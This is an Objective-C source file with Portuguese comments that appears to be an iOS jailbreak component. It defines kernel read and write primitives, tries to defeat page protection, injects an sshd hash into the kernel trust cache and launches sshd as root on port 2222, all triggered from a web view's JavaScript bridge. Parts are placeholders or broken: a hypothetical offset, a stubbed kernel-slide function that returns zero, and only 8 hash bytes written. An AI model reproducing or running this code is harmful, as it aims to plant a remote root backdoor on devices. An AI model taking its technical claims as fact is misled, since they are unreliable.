#import "KernelDriver.h"
#import <CommonCrypto/CommonDigest.h>
#import <mach/mach.h>
#import <mach/mach_host.h>
#import <mach/host_special_ports.h> // Define host_get_host_priv_port
#import <mach/mach_vm.h>             // Necessário para operações de VM
#import <mach/vm_map.h>              // Define vm_map e vm_deallocate
#include <sys/wait.h>
#include <unistd.h>
#include <spawn.h>

// Se o erro de vm_map persistir, adicione esta declaração externa:
extern kern_return_t vm_map(
    vm_map_t target_task,
    vm_address_t *address,
    vm_size_t size,
    vm_address_t mask,
    int flags,
    mem_entry_name_port_t object,
    memory_object_offset_t offset,
    boolean_t copy,
    vm_prot_t cur_protection,
    vm_prot_t max_protection,
    vm_inherit_t inheritance);


@implementation KernelBridge {
    mach_port_t g_host_priv;
}

// 1. OBTENÇÃO DA PORTA DE HOST (O "BYPASS")
- (void)prepareHostPriv {
    if (MACH_PORT_VALID(g_host_priv)) return;
    
    // No iOS 26.4, esta chamada só funciona se o Sandbox já foi quebrado
    kern_return_t kr = host_get_host_priv_port(mach_host_self(), &g_host_priv);
    
    if (kr != KERN_SUCCESS) {
        NSLog(@"[!] Erro: Não foi possível obter host_priv no A13.");
    }
}

// 2. LEITURA DE KERNEL (kread64)
- (uint64_t)kread64:(uint64_t)addr {
    [self prepareHostPriv];
    if (!MACH_PORT_VALID(g_host_priv)) return 0xDEADBEEF;

    uint64_t val = 0;
    vm_address_t page = 0;
    
    // Mapeamos a página física do Kernel como Read-Only para evitar Panic imediato
    kern_return_t kr = vm_map(mach_task_self(), &page, PAGE_SIZE_A13, 0, VM_FLAGS_ANYWHERE, g_host_priv, addr & PAGE_MASK_A13, FALSE, VM_PROT_READ, VM_PROT_READ, VM_INHERIT_NONE);
    
    if (kr == KERN_SUCCESS) {
        val = *(uint64_t *)(page + (addr & (PAGE_SIZE_A13 - 1)));
        vm_deallocate(mach_task_self(), page, PAGE_SIZE_A13);
    }
    return val;
}

// 3. ESCRITA DE KERNEL (kwrite64 - O RISCO DE PANIC)
- (void)kwrite64:(uint64_t)addr value:(uint64_t)val {
    [self prepareHostPriv];
    if (!MACH_PORT_VALID(g_host_priv)) return;

    vm_address_t page = 0;
    // O SEGREDO DO A13: Usamos VM_PROT_COPY para tentar sobrescrever a proteção PPL
    kern_return_t kr = vm_map(mach_task_self(), &page, PAGE_SIZE_A13, 0, VM_FLAGS_ANYWHERE, g_host_priv, addr & PAGE_MASK_A13, FALSE, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_COPY, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_COPY, VM_INHERIT_NONE);
    
    if (kr == KERN_SUCCESS) {
        *(uint64_t *)(page + (addr & (PAGE_SIZE_A13 - 1))) = val;
        // Sincroniza a escrita com a RAM real (Cache Flush)
        #include <libkern/OSCacheControl.h>
        sys_cache_control(1, (void *)page, PAGE_SIZE_A13); 
        vm_deallocate(mach_task_self(), page, PAGE_SIZE_A13);
    }
}

// 4. INJEÇÃO NO TRUSTCACHE (Permitir Execução do SSHD)
- (void)injectToTrustCache:(NSString *)path {
    NSData *data = [NSData dataWithContentsOfFile:path];
    if (!data) return;

    // Calcula o CDHash (SHA256) do binário sshd
    uint8_t hash[CC_SHA256_DIGEST_LENGTH];
    CC_SHA256(data.bytes, (CC_LONG)data.length, hash);
    
    uint64_t slide = [self getKernelSlide];
    // Offset hipotético para iOS 26.4 (Ajustar após reversão do Kernel)
    uint64_t trust_chain_addr = KERNEL_BASE_STATIC + slide + 0x123456; 
    
    uint64_t cdhash_chunk;
    memcpy(&cdhash_chunk, hash, 8);
    
    [self kwrite64:trust_chain_addr value:cdhash_chunk];
    NSLog(@"[+] CDHash Injetado: 0x%llx", cdhash_chunk);
}

// 5. PONTE COM O JAVASCRIPT
- (void)userContentController:(WKUserContentController *)userContentController 
      didReceiveScriptMessage:(WKScriptMessage *)message 
                 replyHandler:(void (^)(id _Nullable, NSString * _Nullable))replyHandler {
    
    NSString *op = message.body[@"action"];
    
    if ([op isEqualToString:@"read64"]) {
        uint64_t addr = strtoull([message.body[@"address"] UTF8String], NULL, 16);
        uint64_t res = [self kread64:addr];
        replyHandler(@{@"value": [NSString stringWithFormat:@"%llu", res]}, nil);
    } 
    else if ([op isEqualToString:@"launch_sshd"]) {
        [self launchSshdFinal];
        replyHandler(@{@"status": @"online"}, nil);
    }
}

- (uint64_t)getKernelSlide {
    // Implementação da busca do Magic 0xfeedfacf via kread64
    // (Vimos no código anterior)
    return 0; 
}

- (void)launchSshdFinal {
    NSString *sshdPath = [[NSBundle mainBundle] pathForResource:@"sshd" ofType:nil];
    [self injectToTrustCache:sshdPath];

    pid_t pid;
    posix_spawnattr_t attr;
    posix_spawnattr_init(&attr);
    // Flag de plataforma necessária para rodar como root
    posix_spawnattr_setflags(&attr, POSIX_SPAWN_SETPGROUP | 0x4000);

    char *const args[] = {(char *)[sshdPath UTF8String], "-p", "2222", "-D", NULL};
    posix_spawn(&pid, [sshdPath UTF8String], NULL, &attr, args, NULL);
}

@end
